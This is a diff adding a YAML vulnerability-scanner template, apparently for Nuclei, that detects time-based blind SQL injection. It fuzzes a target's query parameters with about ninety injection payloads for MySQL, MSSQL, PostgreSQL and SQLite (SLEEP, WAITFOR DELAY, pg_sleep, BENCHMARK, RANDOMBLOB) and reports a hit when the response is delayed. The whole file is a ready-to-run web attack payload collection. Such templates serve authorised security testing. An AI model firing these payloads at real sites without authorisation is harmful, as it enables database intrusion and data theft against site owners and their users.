@@ -1,0 +1,113 @@
+id: bSQLi
+
+info:
+  name: Time based SQL injection
+  author: abdulrahman
+  severity: high
+  tags: sqli
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    payloads:
+      sqli:
+        - "(select*from(select(sleep(20)))a)"
+        - "';WAITFOR DELAY '0:0:20'--"
+        - "sleep(20)#"
+        - "1 or sleep(20)#"
+        - "\" or sleep(20)#"
+        - "' or sleep(20)#"
+        - "\" or sleep(20)=\""
+        - "' or sleep(20)='"
+        - "1) or sleep(20)#"
+        - "\") or sleep(20)=\""
+        - "') or sleep(20)='"
+        - "1)) or sleep(20)#"
+        - "\")) or sleep(20)=\""
+        - "')) or sleep(20)='"
+        - ";waitfor delay '0:0:20'--"
+        - ");waitfor delay '0:0:20'--"
+        - "';waitfor delay '0:0:20'--"
+        - "\";waitfor delay '0:0:20'--"
+        - "');waitfor delay '0:0:20'--"
+        - "\");waitfor delay '0:0:20'--"
+        - "));waitfor delay '0:0:20'--"
+        - "'));waitfor delay '0:0:20'--"
+        - "\"));waitfor delay '0:0:20'--"
+        - "pg_sleep(20)--"
+        - "1 or pg_sleep(20)--"
+        - "\" or pg_sleep(20)--"
+        - "' or pg_sleep(20)--"
+        - "1) or pg_sleep(20)--"
+        - "\") or pg_sleep(20)--"
+        - "') or pg_sleep(20)--"
+        - "1)) or pg_sleep(20)--"
+        - "\")) or pg_sleep(20)--"
+        - "')) or pg_sleep(20)--"
+        - "AND (SELECT * FROM (SELECT(SLEEP(20)))bAKL) AND 'vRxe'='vRxe"
+        - "AND (SELECT * FROM (SELECT(SLEEP(20)))YjoC) AND '%'='"
+        - "AND (SELECT * FROM (SELECT(SLEEP(20)))nQIP)"
+        - "AND (SELECT * FROM (SELECT(SLEEP(20)))nQIP)--"
+        - "AND (SELECT * FROM (SELECT(SLEEP(20)))nQIP)#"
+        - "SLEEP(20)#"
+        - "SLEEP(20)--"
+        - "SLEEP(20)=\""
+        - "SLEEP(20)='"
+        - "or SLEEP(20)"
+        - "or SLEEP(20)#"
+        - "or SLEEP(20)--"
+        - "or SLEEP(20)=\""
+        - "or SLEEP(20)='"
+        - "waitfor delay '00:00:20'"
+        - "waitfor delay '00:00:20'--"
+        - "waitfor delay '00:00:20'#"
+        - "benchmark(50000000,MD5(20))"
+        - "benchmark(50000000,MD5(20))--"
+        - "benchmark(50000000,MD5(20))#"
+        - "or benchmark(50000000,MD5(20))"
+        - "or benchmark(50000000,MD5(20))--"
+        - "or benchmark(50000000,MD5(20))#"
+        - "pg_SLEEP(20)"
+        - "pg_SLEEP(20)--"
+        - "pg_SLEEP(20)#"
+        - "or pg_SLEEP(20)"
+        - "or pg_SLEEP(20)--"
+        - "or pg_SLEEP(20)#"
+        - "AnD SLEEP(20)"
+        - "AnD SLEEP(20)--"
+        - "AnD SLEEP(20)#"
+        - "&&SLEEP(20)"
+        - "&&SLEEP(20)--"
+        - "&&SLEEP(20)#"
+        - "' AnD SLEEP(20) ANd '1"
+        - "'&&SLEEP(20)&&'1"
+        - "ORDER BY SLEEP(20)"
+        - "ORDER BY SLEEP(20)--"
+        - "ORDER BY SLEEP(20)#"
+        - "(SELECT * FROM (SELECT(SLEEP(20)))ecMj)"
+        - "(SELECT * FROM (SELECT(SLEEP(20)))ecMj)#"
+        - "(SELECT * FROM (SELECT(SLEEP(20)))ecMj)--"
+        - "+benchmark(3200,SHA1(1))+'"
+        - "+ SLEEP(20) + '"
+        - "RANDOMBLOB(500000000/2)"
+        - "AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))"
+        - "OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))"
+        - "RANDOMBLOB(1000000000/2)"
+        - "AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))"
+        - "OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))"
+        - "SLEEP(1)/*' or SLEEP(20) or '\" or SLEEP(1) or \"*/"
+        - "O'XOR(if(now()=sysdate(),sleep(20),0))XOR'Z"
+
+    fuzzing:
+      - part: query
+        type: replace
+        fuzz:
+          - "{{sqli}}"
+    
+    stop-at-first-match: true
+    matchers:
+      - type: dsl
+        dsl:
+          - "duration>=19"
